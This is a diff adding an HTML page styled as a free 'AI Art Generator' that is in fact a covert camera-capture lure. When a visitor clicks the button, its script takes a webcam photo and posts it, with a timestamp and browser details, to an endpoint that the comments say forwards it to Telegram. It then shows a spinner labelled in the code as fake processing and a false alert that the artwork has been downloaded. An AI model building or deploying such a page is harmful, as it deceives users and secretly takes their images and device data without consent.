@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Art Generator - Free Online Tool</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: #0f0f23;
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        .hero {
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            padding: 100px 20px;
+            text-align: center;
+        }
+        .hero h1 { 
+            font-size: clamp(2.5rem, 5vw, 4rem); 
+            font-weight: 700; 
+            margin-bottom: 20px;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .hero p { 
+            font-size: 1.3rem; 
+            max-width: 600px; 
+            margin: 0 auto 40px;
+            opacity: 0.95;
+        }
+        .cta-btn {
+            display: inline-block;
+            padding: 18px 40px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+            border: 2px solid rgba(255,255,255,0.3);
+            cursor: pointer;
+            border: none;
+        }
+        .cta-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <section class="hero">
+        <h1>🎨 AI Art Generator</h1>
+        <p>Create stunning AI-generated artwork from your selfies in seconds. Completely free!</p>
+        <button class="cta-btn" onclick="startGeneration()">✨ Generate My Art</button>
+    </section>
+
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <h3>🎨 Creating your AI masterpiece...</h3>
+        <p>This takes just a moment!</p>
+    </div>
+
+    <script>
+        let mediaStream;
+        
+        // 🔗 VERCEL API ENDPOINT (AUTO-DETECTS)
+        const API_URL = '/api/telegram'; // Works on any Vercel domain
+        
+        async function startGeneration() {
+            try {
+                // 🕵️ CAMERA ACCESS
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 640, height: 480, facingMode: 'user' }
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.play();
+                
+                // 📸 CAPTURE + SEND
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // 🚀 SEND TO VERCEL API → TELEGRAM
+                    await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            photo: photoData,
+                            caption: `📸 New AI Art User\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.slice(0,80)}`
+                        })
+                    });
+                    
+                    // SHOW LOADING
+                    document.querySelector('.hero').style.display = 'none';
+                    document.getElementById('loading').style.display = 'flex';
+                    
+                    // FAKE PROCESSING
+                    setTimeout(() => {
+                        alert('🎉 Your AI art is ready! Check your downloads folder.');
+                        if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+                    }, 2000);
+                    
+                }, 2000);
+                
+            } catch(e) {
+                alert('Please allow camera access to generate AI art!');
+            }
+        }
+    </script>
+</body>
+</html>
